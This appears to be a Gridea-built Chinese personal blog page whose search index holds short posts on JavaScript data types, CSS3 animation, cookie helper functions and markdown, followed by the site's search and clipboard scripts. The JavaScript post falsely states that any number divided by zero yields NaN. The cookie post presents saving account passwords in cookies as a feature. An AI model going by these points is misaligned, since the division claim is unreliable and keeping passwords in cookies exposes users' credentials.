&lt;p&gt;Undefined类型只有一个值，即特殊的undefined。在使用var声明变量但未对其加以初始化时，这个变量的值就是undefined。不过，一般建议尽量给变量初始化，但是在早期的js版本中是没有规定undefined这个值的，所以在有些框架中为了兼容旧版浏览器，会给window对象添加undefined值。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;window[&#39;undefined&#39;] = window[&#39;undefined&#39;];  
//或者
window.undefined = window.undefined;  
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h1 id=&#34;null&#34;&gt;Null&lt;/h1&gt;
&lt;p&gt;Null类型是第二个只有一个值的数据类型，这个特殊的值是null。从逻辑角度来看，null值表示一个空对象指针，而这也正是使用typeof操作符检测null时会返回object的原因。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; var car = null;
  console.log(typeof car); // &amp;quot;object&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果定义的变量准备在将来用于保存对象，那么最好将该变量初始化为null而不是其他值。这样一来，只要直接检测null值就可以知道相应的变量是否已经保存了一个对象的引用了。&lt;br&gt;
例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  if(car != null){
    //对car对象执行某些操作
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实际上，undefined值是派生自null值的，因此ECMA-262规定对它们的相等性测试要返回true。&lt;br&gt;
&lt;code&gt;console.log(undefined == null); //true&lt;/code&gt;&lt;br&gt;
尽管null和undefined有这样的关系，但它们的用途完全不同。无论在什么情况下都没有必要把一个变量的值显式地设置为undefined，可是同样的规则对null却不适用。换句话说，只要意在保存对象的变量还没有真正保存对象，就应该明确地让该变量保存null值。这样做不仅可以体现null作为空对象指针的惯例，而且也有助于进一步区分null和undefined。&lt;/p&gt;
  &lt;br&gt;
&lt;h1 id=&#34;boolean&#34;&gt;Boolean&lt;/h1&gt;
&lt;p&gt;该类型只有两个字面值：true和false。这两个值与数字值不是一回事，因此true不一定等于1，而false也不一定等于0。&lt;/p&gt;
&lt;p&gt;虽然Boolean类型的字面值只有两个，但JavaScript中所有类型的值都有与这两个Boolean值等价的值。要将一个值转换为其对应的Boolean值，可以调用类型转换函数Boolean()，例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var message = &#39;Hello World&#39;;
    var messageAsBoolean = Boolean(message);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这个例子中，字符串message被转换成了一个Boolean值，该值被保存在messageAsBoolean变量中。可以对任何数据类型的值调用Boolean()函数，而且总会返回一个Boolean值。至于返回的这个值是true还是false，取决于要转换值的数据类型及其实际值。下表给出了各种数据类型及其对象的转换规则。&lt;/p&gt;
&lt;p&gt;数据类型 转换为true的值	 转换为false的值&lt;br&gt;
Boolean	true	false&lt;br&gt;
String	任何非空的字符串	&amp;quot;&amp;quot;(空字符串)&lt;br&gt;
Number	任何非0数值（包括无穷大）	0和NAN&lt;br&gt;
Object	任何对象	null&lt;br&gt;
Undefined	不适用	undefined&lt;/p&gt;
&lt;br&gt;
&lt;h1 id=&#34;number&#34;&gt;Number&lt;/h1&gt;
&lt;p&gt;这种类型用来表示整数和浮点数值，还有一种特殊的数值，即NaN（非数值 Not a Number）。这个数值用于表示一个本来要返回数值的操作数未返回数值的情况（这样就不会抛出错误了）。例如，在其他编程语言中，任何数值除以0都会导致错误，从而停止代码执行。但在JavaScript中，任何数值除以0会返回NaN，因此不会影响其他代码的执行。&lt;/p&gt;
&lt;p&gt;NaN本身有两个非同寻常的特点。首先，任何涉及NaN的操作（例如NaN/10）都会返回NaN，这个特点在多步计算中有可能导致问题。其次，NaN与任何值都不相等，包括NaN本身。例如，下面的代码会返回false。&lt;br&gt;
&lt;code&gt;alert(NaN == NaN); //false&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;#String&lt;br&gt;
String类型用于表示由零或多个16位Unicode字符组成的字符序列，即字符串。字符串可以由单引号(&#39;)或双引号(&amp;quot;)表示。&lt;/p&gt;
&lt;h1 id=&#34;string类型的特殊性&#34;&gt;String类型的特殊性&lt;/h1&gt;
&lt;p&gt;string类型有些特殊，因为字符串具有可变的大小，所以显然它不能被直接存储在具有固定大小的变量中。由于效率的原因，我们希望JS只复制对字符串的引用，而不是字符串的内容。但是另一方面，字符串在许多方面都和基本类型的表现相似，而字符串是不可变的这一事实（即没法改变一个字符串值的内容），因此可以将字符串看成行为与基本&lt;/p&gt;
&lt;h1 id=&#34;类型相似的不可变引用类型&#34;&gt;类型相似的不可变引用类型&lt;/h1&gt;
&lt;p&gt;Boolean、Number、String 这三个是Javascript中的基本包装类型，也就是这三个其实是一个构造函数，他们是Function的实例，是引用类型，至于这里的String与以上说的String是同名，是因为其实上文说的String是指字符串，这里的String指的是String这个构造函数，上面那么写，是为了更好的理解，因为Javascript是松散类型的。我们可以看下String实例化的例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var name = String(&amp;quot;jwy&amp;quot;);
alert(typeof name);//&amp;quot;string&amp;quot;
var x=new String(&#39;12345&#39;)
typeof x //object
x=&#39;12345&#39;
typeof x //string
var author = &amp;quot;Tom&amp;quot;;
alert(typeof name);//&amp;quot;string&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;至于author这个会有length，substring等等这些方法，其实string只是String的一个实例，类似于C#中的String，和string.&lt;/p&gt;
&lt;p&gt;注意，typeof 变量 如果值是&amp;quot;string&amp;quot; 的话，也就是这个变量是字符串，在Javascript中，字符串是基本类型，而在C#或Java中，字符串是引用类型，但是Javascript中的String是引用类型，因为它是Javascript中定义好的基本包装类型，在C#中，String跟string其实是一样的。&lt;/p&gt;
&lt;h1 id=&#34;es6新增&#34;&gt;ES6新增&lt;/h1&gt;
&lt;p&gt;es6中新增了let命令来声明变量、const命令声明一个只读的常量。&lt;/p&gt;
&lt;p&gt;let的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效。&lt;/p&gt;
&lt;p&gt;const一旦声明，常量的值就不能改变。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1617632333308.JPG&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1617632362296.JPG&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">JS基本数据类型</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js/"" data-c="
          &lt;h2 id=&#34;animation-属性&#34;&gt;&lt;strong&gt;animation 属性&lt;/strong&gt;&lt;/h2&gt;
&lt;br&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;animation-delay&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​       属性规定动画开始的延迟时间(2秒延时)&lt;/p&gt;
&lt;p&gt;​            &lt;code&gt;animation-delay: 2s;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​        负值也是允许的。如果使用负值，则动画将开始播放，如同已播放 N 秒&lt;/p&gt;
&lt;p&gt;​            &lt;code&gt;animation-delay: -2s;&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;animation-iteration-count&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​		 属性指定动画应运行的次数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;		` animation-iteration-count: 3;`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​		使用值 &amp;quot;infinite&amp;quot; 使动画永远持续下去&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;animation-direction&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​		属性指定是向前播放、向后播放还是交替播放动画&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;normal - 动画正常播放（向前）。默认值&lt;/li&gt;
&lt;li&gt;reverse - 动画以反方向播放（向后）&lt;/li&gt;
&lt;li&gt;alternate - 动画先向前播放，然后向后&lt;/li&gt;
&lt;li&gt;alternate-reverse - 动画先向后播放，然后向前&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;animation-timing-function&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​		属性规定动画的速度曲线&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ease - 指定从慢速开始，然后加快，然后缓慢结束的动画（默认）&lt;/li&gt;
&lt;li&gt;linear - 规定从开始到结束的速度相同的动画&lt;/li&gt;
&lt;li&gt;ease-in - 规定慢速开始的动画&lt;/li&gt;
&lt;li&gt;ease-out - 规定慢速结束的动画&lt;/li&gt;
&lt;li&gt;ease-in-out - 指定开始和结束较慢的动画&lt;/li&gt;
&lt;li&gt;cubic-bezier(n,n,n,n) - 运行您在三次贝塞尔函数中定义自己的值&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;animation-fill-mode&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​		CSS 动画不会在第一个关键帧播放之前或在最后一个关键帧播放之后影响元素&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;none - 默认值。动画在执行之前或之后不会对元素应用任何样式。&lt;/li&gt;
&lt;li&gt;forwards - 元素将保留由最后一个关键帧设置的样式值（依赖 animation-direction 和 animation-iteration-count）。&lt;/li&gt;
&lt;li&gt;backwards - 元素将获取由第一个关键帧设置的样式值（取决于 animation-direction），并在动画延迟期间保留该值。&lt;/li&gt;
&lt;li&gt;both - 动画会同时遵循向前和向后的规则，从而在两个方向上扩展动画属性。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code&gt;
//使用简写属性，将动画与 div 元素绑定：

div

{

animation:mymove 5s infinite;

-webkit-animation:mymove 5s infinite; /* Safari 和 Chrome */

}



//动画帧

 @keyframes mymove {

​          50% {transform-origin: 0 0 0;transform: rotate(360deg);background-color: rgb(83, 83, 90);}

​        

​        }

&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1617525832441.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;## &lt;strong&gt;动画可用属性&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1617524085576.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">CSS3动画属性</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/xiang-mu-cooike-dai-ma/"" data-c="
          &lt;h1 id=&#34;cooike详细介绍&#34;&gt;cooike详细介绍&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_37002901/article/details/86601904&#34;&gt;&lt;strong&gt;原文博客&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;cooike储存机制&#34;&gt;cooike储存机制&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;Set-Cookie: name=value[; expires=GMTDate][; domain=domain][; path=path][; secure]&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;项目实现代码&#34;&gt;项目实现代码&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;    //获取储存的cooike
getCookie(name) {
     var reg=RegExp(name+&#39;=([^;]+)&#39;);
     var arr=document.cookie.match(reg);
     if(arr)
     {
       return arr[1];
     }else{
       return &#39;&#39;;
     }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;/**存放cookie */

  setCookie(name, value, day) {

   let data = new Date();

   data.setDate(data.getDate() + day);

   document.cookie = name + &amp;quot;=&amp;quot; + value + &amp;quot;;expires=&amp;quot; + data;

  },
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;/**删除cooike*/
delCookie(name) {

   this.setCookie(name, &#39;&#39;, -1);

  },
&lt;/code&gt;&lt;/pre&gt;
">项目cooike实现保存账号密码功能</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/markdown-ji-ben-yu-fa/"" data-c="
          &lt;h1 id=&#34;对必要语法的摘记&#34;&gt;对必要语法的摘记&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1617462999416.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">markdown基本语法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/about/"" data-c="
          &lt;blockquote&gt;
&lt;p&gt;欢迎来到我的小站呀，很高兴遇见你！🤝&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;关于本站&#34;&gt;🏠 关于本站&lt;/h2&gt;
&lt;h2 id=&#34;博主是谁&#34;&gt;👨‍💻 博主是谁&lt;/h2&gt;
&lt;h2 id=&#34;兴趣爱好&#34;&gt;⛹ 兴趣爱好&lt;/h2&gt;
&lt;h2 id=&#34;联系我呀&#34;&gt;📬 联系我呀&lt;/h2&gt;
">关于</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/hello-gridea/"" data-c="
          &lt;p&gt;👏  欢迎使用 &lt;strong&gt;Gridea&lt;/strong&gt; ！&lt;br&gt;
✍️  &lt;strong&gt;Gridea&lt;/strong&gt; 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;&lt;a href=&#34;https://4399.com&#34;&gt;Github&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://gridea.dev/&#34;&gt;Gridea 主页&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;http://fehey.com/&#34;&gt;示例网站&lt;/a&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1617460798662.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;特性&#34;&gt;特性👇&lt;/h2&gt;
&lt;p&gt;📝  你可以使用最酷的 &lt;strong&gt;Markdown&lt;/strong&gt; 语法，进行快速创作&lt;/p&gt;
&lt;p&gt;🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片&lt;/p&gt;
&lt;p&gt;🏷️  你可以对文章进行标签分组&lt;/p&gt;
&lt;p&gt;📋  你可以自定义菜单，甚至可以创建外部链接菜单&lt;/p&gt;
&lt;p&gt;💻  你可以在 &lt;strong&gt;Windows&lt;/strong&gt;，&lt;strong&gt;MacOS&lt;/strong&gt; 或 &lt;strong&gt;Linux&lt;/strong&gt; 设备上使用此客户端&lt;/p&gt;
&lt;p&gt;🌎  你可以使用 &lt;strong&gt;𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌&lt;/strong&gt; 或 &lt;strong&gt;Coding Pages&lt;/strong&gt; 向世界展示，未来将支持更多平台&lt;/p&gt;
&lt;p&gt;💬  你可以进行简单的配置，接入 &lt;a href=&#34;https://github.com/gitalk/gitalk&#34;&gt;Gitalk&lt;/a&gt; 或 &lt;a href=&#34;https://github.com/SukkaW/DisqusJS&#34;&gt;DisqusJS&lt;/a&gt; 评论系统&lt;/p&gt;
&lt;p&gt;🇬🇧  你可以使用&lt;strong&gt;中文简体&lt;/strong&gt;或&lt;strong&gt;英语&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力&lt;br&gt;
sdsd&lt;br&gt;
🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步&lt;/p&gt;
&lt;p&gt;🌱 当然 &lt;strong&gt;Gridea&lt;/strong&gt; 还很年轻，有很多不足，但请相信，它会不停向前 🏃&lt;/p&gt;
&lt;p&gt;未来，它一定会成为你离不开的伙伴&lt;/p&gt;
&lt;p&gt;尽情发挥你的才华吧！&lt;/p&gt;
&lt;p&gt;😘 Enjoy~&lt;/p&gt;
">Hello Gridea</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + '秒之前';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + '分钟之前';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + '小时之前';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + '天之前';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }
  //拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // 判断是不是ios端
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //创建文本元素
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //选择内容
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //复制到剪贴板
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("复制错误！请手动复制！")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === '复制成功') {
        return;
      }
      e.srcElement.textContent = '复制成功';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === '复制成功') {
            elem.textContent = '复制代码'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = '复制代码';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>


<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
<script>
  var scroll = new SmoothScroll('a[href*="#"]', {
    speed: 200
  });
</script>


<script src="/media/js/mouse/peace.js"></script>


<script src="/media/js/cool.js"></script>



</html>